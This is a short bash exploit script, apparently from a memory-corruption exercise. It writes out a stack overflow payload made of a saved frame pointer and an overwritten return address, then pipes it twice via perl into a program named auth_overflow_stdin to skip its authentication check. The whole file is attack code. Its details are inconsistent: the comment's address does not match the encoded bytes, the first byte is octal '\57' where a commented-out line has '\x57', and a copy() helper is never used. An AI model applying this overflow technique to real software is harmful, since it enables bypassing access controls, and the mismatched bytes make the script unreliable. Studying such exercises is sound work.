#!/bin/bash
# 0x000000000040070e
# 64
main() {
	RETURN_ADDRESS="\57\x07\x40\x00\x00\x00\x00\x00"
	FRAME_POINTER="\xd0\xd9\xff\xff\xff\x7f\x00\x00"

	printf "$RETURN_ADDRESS" | xxd
	perl -e 'print "${FRAME_POINTER}${RETURN_ADDRESS}" x2' | auth_overflow_stdin
	# perl -e 'print "\xd0\xd9\xff\xff\xff\x7f\x00\x00\x57\x07\x40\x00\x00\x00\x00\x00" x2' | auth_overflow_stdin
}

copy() {
	local count=$1
	shift 1
	local value=$@
	local result=

	for ((i=0; i<$count; i++))
	do
		result+=$value
	done
	echo $result
}

main
